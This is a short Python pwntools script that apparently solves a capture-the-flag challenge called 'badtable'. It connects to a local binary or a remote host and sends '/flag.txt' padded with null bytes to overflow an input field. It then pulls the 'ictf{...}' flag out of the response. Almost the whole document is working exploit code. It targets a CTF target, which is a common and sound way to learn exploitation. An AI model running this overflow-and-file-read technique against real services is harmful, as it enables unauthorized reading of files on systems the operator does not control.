import argparse
import re
import struct
from pwn import *

# context.log_level = 'debug'

def unsigned2int(value):
    return struct.unpack('i', p32(value))[0]

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    # --remote <host> <port>
    parser.add_argument('--remote', nargs=2, metavar=('host', 'port'), required=False)
    parser.add_argument('--local', action='store_true', required=False)
    args = parser.parse_args()

    assert args.remote or args.local, 'Must specify either --remote or --local'

    if args.local:
        r = process(['./badtable', './flag.txt'])
    else:
        r = remote(args.remote[0], args.remote[1])

    r.recvuntil(b" access:")
    r.sendline(b"/flag.txt" + b'\x00' * (256 - len(b"/flag.txt")) + b'\x00' * 4 + b'\n')

    # find ictf{...} in flag with regex
    flag = re.search(b'ictf{.*}', r.recvall()).group(0)
    print(f"Got the flag: {flag.decode()}")

    # r.interactive()